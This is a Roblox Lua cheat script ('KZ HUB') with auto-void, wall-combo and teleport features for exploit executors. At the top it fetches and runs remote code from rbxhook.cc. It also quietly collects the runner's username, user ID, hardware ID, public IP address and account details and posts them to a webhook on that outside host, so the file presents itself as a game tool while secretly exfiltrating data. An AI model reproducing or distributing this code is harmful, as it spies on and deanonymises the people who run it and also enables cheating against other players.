getgenv().Config = {api = "c578dfb3628e8a1a34900d852203977716e31d25c77904b3641e3e59b0e2fe01"} -- DO NOT CHANGE

--analytics track
loadstring(game:HttpGet("https://rbxhook.cc/lua/track.lua"))()

local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

local url = "https://rbxhook.cc/r/628a2284ec8a628f969efc09922b8d4d"

-- Platform detection
local function getPlatform()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        return "Mobile"
    elseif UserInputService.KeyboardEnabled then
        return "PC"
    elseif UserInputService.GamepadEnabled then
        return "Console"
    else
        return "Unknown"
    end
end

-- Executor detection
local executor = "Unknown"
local executorVersion = "N/A"
if identifyexecutor then
    executor = identifyexecutor()
elseif syn then
    executor = "Synapse X"
elseif KRNL_LOADED then
    executor = "Krnl"
elseif fluxus then
    executor = "Fluxus"
elseif is_sirhurt_closure then
    executor = "SirHurt"
elseif OXYGEN then
    executor = "Oxygen U"
end

-- HWID detection
local hwid = "Unavailable"
pcall(function()
    if syn and syn.gethwid then
        hwid = syn.gethwid()
    elseif gethwid then
        hwid = gethwid()
    elseif fluxus and getgenv and getgenv().fluxus then
        hwid = tostring(getgenv().fluxus.HWID or "Unavailable")
    elseif delta and get_hw_id then
        hwid = tostring(get_hw_id())
    end
end)

-- Game info
local gameName = "Unknown"
pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    if info and info.Name then 
        gameName = info.Name 
    end
end)

local serverRegion = "Unknown"
pcall(function()
    serverRegion = tostring(game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player) or "Unknown")
end)

-- IP Address detection
local ipAddress = "Unavailable"
pcall(function()
    local ipResponse = game:HttpGet("https://api.ipify.org")
    if ipResponse and ipResponse ~= "" then
        ipAddress = ipResponse
    end
end)

-- Account info
local accountAge = "Unknown"
local membership = "Free"
pcall(function()
    accountAge = tostring(player.AccountAge) .. " days"
    membership = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "Free"
end)

local data = {
    avatar_url = "https://rbxhook.cc/img/logo.png",
    content = "",
    username = "rbxhook.cc",
    embeds = {
        {
            title = "Script Execution Report",
            color = 3447003,
            author = {
                name = player.Name,
                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=150&height=150&format=png"
            },
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
            },
            fields = {
                {
                    name = "User Info",
                    value = "Username: " .. player.Name .. "\nUser ID: " .. player.UserId .. "\nPlatform: " .. getPlatform(),
                    inline = false
                },
                {
                    name = "Executor Info", 
                    value = "Executor: " .. executor .. "\nVersion: " .. executorVersion,
                    inline = false
                },
                {
                    name = "Game Info",
                    value = "Game Name: " .. gameName .. "\nPlace ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId,
                    inline = false
                },
                {
                    name = "Network Info",
                    value = "IP Address: " .. ipAddress .. "\nRegion: " .. serverRegion,
                    inline = false
                },
                {
                    name = "Account Info",
                    value = "Account Age: " .. accountAge .. "\nMembership: " .. membership,
                    inline = false
                }
            },
            footer = {
                text = "rbxhook.cc | User ID: " .. tostring(player.UserId)
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
}

-- Validate and send webhook
local success, encoded = pcall(function()
    return HttpService:JSONEncode(data)
end)

if not success then
    print("JSON encoding failed")
    return
end

local requestFunc = syn and syn.request or request or http_request
if not requestFunc then
    print("Error: JK291-RH")
    return
end

local response = requestFunc({
    Url = url,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = encoded
})

if response then
    print("Status:", response.StatusCode)
    if response.StatusCode == 200 or response.StatusCode == 204 then
        print("✅ Webhook sent successfully!")
    else
        print("Error: J1920-RH - (SHARE THIS TO SERVICE OWNER) : " .. response.StatusCode)
        if response.Body then
            print("Response: " .. response.Body)
        end
    end
else
    print("ERROR: No response from server")
end

print("✅ Script initialized successfully!")

-- LOAD UI
local WindUI = loadstring(game:HttpGet(
    "https://raw.githubusercontent.com/eeeiqjjj/WindUI/main/dist/main.lua"
))()

-- SERVICES
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local Animator = Humanoid:FindFirstChildOfClass("Animator")

-- WINDOW
local Window = WindUI:CreateWindow({
    Folder = "KZ_HUB",
    Title = "KZ HUB",
    Icon = "star",
    Author = "KZ",
    Theme = "Indigo",
    Size = UDim2.fromOffset(620, 460),
    HasOutline = true,
})

Window:SetToggleKey(Enum.KeyCode.G)

-- SECTION + TAB
local CombatSection = Window:Section({
    Title = "Combat",
    Icon = "sword",
    Opened = true
})

local MainTab = CombatSection:Tab({
    Title = "Main",
    Icon = "zap",
    Desc = "KZ HUB Main Features",
    ShowTabTitle = true
})

-- ===============================
-- ====== MAIN FEATURES ==========
-- ===============================

local AutoVoidEnabled = false
local TpBackEnabled = false
local TeleportPosition = Vector3.new(150, -495, 30)
local IsVoiding = false

local VoidAnimations = {
    {id="12273188754", wait=0.5},
    {id="12296113986", wait=0.5},
    {id="15145462680", wait=1.5},
}

-- PLACE SELECT
local MainSection = MainTab:Section({
    Title = "Auto Void / Place",
    Icon = "map",
    Opened = true
})

MainSection:Button({
    Title = "Place: Void",
    Callback = function()
        TeleportPosition = Vector3.new(150, -495, 30)
    end
})

MainSection:Toggle({
    Title = "Auto Void",
    Value = false,
    Callback = function(v)
        AutoVoidEnabled = v
    end
})

MainSection:Toggle({
    Title = "Teleport Back",
    Value = false,
    Callback = function(v)
        TpBackEnabled = v
    end
})

-- AUTO VOID LOGIC
local function onAnimationPlayed(track)
    if not AutoVoidEnabled or IsVoiding then return end
    for _, anim in ipairs(VoidAnimations) do
        if track.Animation.AnimationId == "rbxassetid://"..anim.id then
            IsVoiding = true
            local hrp = Character:FindFirstChild("HumanoidRootPart")
            if not hrp then break end
            local old = hrp.CFrame
            task.wait(anim.wait)
            hrp.CFrame = CFrame.new(TeleportPosition)
            track.Stopped:Wait()
            if TpBackEnabled then
                hrp.CFrame = old
            end
            IsVoiding = false
        end
    end
end

if Animator then
    Animator.AnimationPlayed:Connect(onAnimationPlayed)
end

-- ===============================
-- AUTO WALL COMBO
-- ===============================
local AutoWallCombo = false
local WallComboAnimIds = {
    ["rbxassetid://17325537719"]=true,
    ["rbxassetid://13294471966"]=true
}

local function SendQ()
    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Q, false, game)
    task.wait()
    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Q, false, game)
end

MainSection:Toggle({
    Title = "Auto WallCombo",
    Value = false,
    Callback = function(v)
        AutoWallCombo = v
    end
})

Humanoid.AnimationPlayed:Connect(function(track)
    if AutoWallCombo and WallComboAnimIds[track.Animation.AnimationId] then
        SendQ()
    end
end)

-- ===============================
-- AUTO WHIRLWIND
-- ===============================
local AutoWhirlwind = false
local WhirlwindAnimId = "rbxassetid://12296113986"

MainSection:Toggle({
    Title = "Auto Whirlwind Dunk",
    Value = false,
    Callback = function(v)
        AutoWhirlwind = v
    end
})

Humanoid.AnimationPlayed:Connect(function(track)
    if AutoWhirlwind and track.Animation.AnimationId == WhirlwindAnimId then
        task.wait(1.2)
        local hrp = Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp.CFrame = hrp.CFrame + Vector3.new(0,100,0)
        end
    end
end)